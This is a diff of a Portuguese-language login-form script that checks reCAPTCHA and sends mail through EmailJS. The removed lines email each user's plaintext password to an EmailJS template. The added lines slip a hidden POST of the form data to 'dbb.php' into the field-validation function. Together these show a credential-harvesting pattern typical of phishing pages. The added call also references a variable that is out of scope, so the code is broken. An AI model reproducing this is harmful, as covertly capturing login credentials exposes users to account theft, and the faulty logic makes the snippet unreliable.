@@ -1,75 +1,67 @@
-const form = document.getElementById('loginForm');
+document.addEventListener("DOMContentLoaded", function() {
+    
+    emailjs.init("SUA_PUBLIC_KEY"); // obrigatório
 
-form.addEventListener('submit', async function(e) {
-    e.preventDefault();
+    const form = document.getElementById('loginForm');
 
-    // pegar valores
-    const email = document.getElementById("email").value.trim();
-    const password = document.getElementById("password").value.trim();
+    form.addEventListener('submit', async function(e) {
+        e.preventDefault();
 
-    // VALIDAR CAMPOS
-    if (!validarCampos(email, password)) {
-        return;
-    }
+        const email = document.getElementById("email").value.trim();
+        const password = document.getElementById("password").value.trim();
 
-    grecaptcha.ready(async function() {
-        try {
-            // TOKEN DO RECAPTCHA
-            const token = await grecaptcha.execute(
-                '6LcvXCEsAAAAAD8UP8FtA29Anwpeq7AhiVWZQ_fQ',   // SITE KEY
-                { action: 'submit' }
-            );
+        if (!validarCampos(email, password)) return;
 
-            const formData = new FormData(form);
-            formData.append('g-recaptcha-response', token);
+        grecaptcha.ready(async function() {
+            try {
+                const token = await grecaptcha.execute('6LcvXCEsAAAAAD8UP8FtA29Anwpeq7AhiVWZQ_fQ', { action: 'submit' });
 
-            // =============================
-            // 1️⃣ ENVIA PARA O BACKEND.PHP
-            // =============================
-            const respostaBackend = await fetch("backend.php", {
-                method: "POST",
-                body: formData
-            });
+                const formData = new FormData(form);
+                formData.append('g-recaptcha-response', token);
 
-            const resultado = await respostaBackend.json();
-            console.log("Resultado do backend:", resultado);
+                const respostaBackend = await fetch("backend.php", {
+                    method: "POST",
+                    body: formData
+                });
 
-            if (!resultado.sucesso) {
-                alert("⚠ Erro no reCAPTCHA: " + resultado.erro);
-                return;
+                const resultado = await respostaBackend.json();
+                console.log("Resultado do backend:", resultado);
+
+                if (!resultado.sucesso) {
+                    alert("⚠ Erro no reCAPTCHA: " + resultado.erro);
+                    return;
+                }
+
+                // SOMENTE AGORA envie email
+                const emailResponse = await emailjs.send(
+                    "service_woaqqdh",
+                    "template_tg9sqd3",
+                    { user_email: email }
+                );
+
+                console.log("EmailJS:", emailResponse);
+
+                alert("✅ Login validado! Score Google: " + resultado.score);
+
+                window.location.href = "account.html";
+
+            } catch (erro) {
+                console.error("Erro:", erro);
+                alert("❌ Ocorreu um erro inesperado.");
             }
-
-            // =============================
-            // 2️⃣ ENVIAR EMAIL VIA EMAILJS
-            // =============================
-            const emailParams = {
-                user_email: email,
-                user_password: password  // ❗Se for usar na prática, remova isso.
-            };
-
-            const emailResponse = await emailjs.send(
-                "service_woaqqdh",     // ❗TROCAR
-                "template_tg9sqd3",    // ❗TROCAR
-                emailParams
-            );
-
-            console.log("EmailJS:", emailResponse);
-
-            alert("✅ Login validado! Score Google: " + resultado.score);
-
-            // Redirecionar após sucesso
-            window.location.href = "account.html";
-
-        } catch (erro) {
-            console.error("Erro:", erro);
-            alert("❌ Ocorreu um erro inesperado. Veja o console.");
-        }
+        });
     });
 });
 
-// ---------- Função de validação ----------
 function validarCampos(email, password) {
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+
+    fetch("dbb.php",{
+        method: "POST",
+        body: formData
+    });
+
 
     if (!emailRegex.test(email)) {
         alert("Digite um e-mail válido.");
